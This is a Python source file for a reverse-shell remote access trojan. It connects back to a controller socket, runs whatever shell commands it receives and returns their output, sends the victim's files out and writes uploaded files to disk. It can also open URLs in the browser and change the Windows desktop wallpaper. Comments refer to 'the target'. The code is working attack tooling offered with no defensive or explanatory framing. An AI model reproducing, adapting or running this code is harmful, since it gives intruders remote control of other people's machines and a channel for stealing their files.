

import socket 
import subprocess 
import os          
import webbrowser
import platform
import ctypes
def transfer(s,command,os):
    x1,path=command.split('*')
    if (x1=='download'):
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while packet != '':
                s.send(packet) 
                packet = f.read(1024)
            s.send('DONE')
            f.close()
        else: # the file doesn't exist
            s.send('Unable to find out the file')
  
    elif (x1=='upload'):
        dest=str(path.split(' ')[-1])
        if os=='Linux':
            init_path='/root/Desktop/'
        else :
            init_path='C:\\'
        file_to_write=open(init_path+dest,'wb')
        bits=s.recv(1024)    
        while True: 
            file_to_write.write(bits)
            if bits.endswith('DONE'):
                bits=bits.replace('DONE','')
                file_to_write.write(bits)
                file_to_write.close()
                break
            bits=s.recv(1024)
        s.send('DONE')    
#upload needs fixing                

def __browse(s,command):
    new = 2 
    url=command.split(' ')[-1]
    url="http://"+url
    webbrowser.open(url)

def change_dk_bg(s,command):

    #need to make the path variable because i will normally upload an image from my system to the target
    bg_path=str(command.split(' ')[-1])
    
    SPI_SETDESKWALLPAPER = 20 
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, bg_path , 0)

        
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 8082))
    os=str(platform.system())
    while True: 
        command=s.recv(1024)
        if 'terminate' in command:
            s.close()
            break 
        elif 'download' in command:            
            transfer(s,command,os)
        elif 'upload' in command:
            transfer(s,command,os)
        elif 'browse' in command:
            __browse(s,command)
        elif 'change_dk_bg' in command:
            change_dk_bg(s,command)
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    connect()
main()




''' elif 'cd' in command:
            cd(s,command)
              elif 'ls' in command:
            path=str(command.split(' ')[-1])
            print path
            CMD =  subprocess.Popen('ls '+path, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) '''





